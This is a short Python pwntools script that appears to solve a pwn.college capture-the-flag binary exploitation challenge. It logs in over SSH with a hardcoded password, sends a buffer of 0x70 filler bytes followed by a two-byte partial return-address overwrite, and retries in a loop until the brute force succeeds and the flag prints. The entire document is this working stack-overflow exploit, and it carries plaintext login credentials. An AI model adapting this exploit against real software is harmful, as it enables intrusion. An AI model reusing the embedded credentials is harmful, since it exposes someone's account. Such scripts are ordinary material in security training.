from pwn import *

e = ELF('./babyrop_level10_testing1')
libc = ELF('../../libc6_2.31-0ubuntu9.2_amd64.so')
s = ssh(user="ssu-csec",host="ssu-csec.pwn.college",keyfile='../../csec',port=22,password='djaxod12')

while 1:
    try:
        p = s.run('/babyrop_level10_testing1')

        pay = b'A' * 0x70
        pay += b'\x28\x8E'

        p.sendafter(b'.\n\n',pay)

        p.recvuntil(b'Goodbye!')
        p.recvuntil(b'flag: ')
        print(p.recv().decode().strip())

        break
    except:
        pass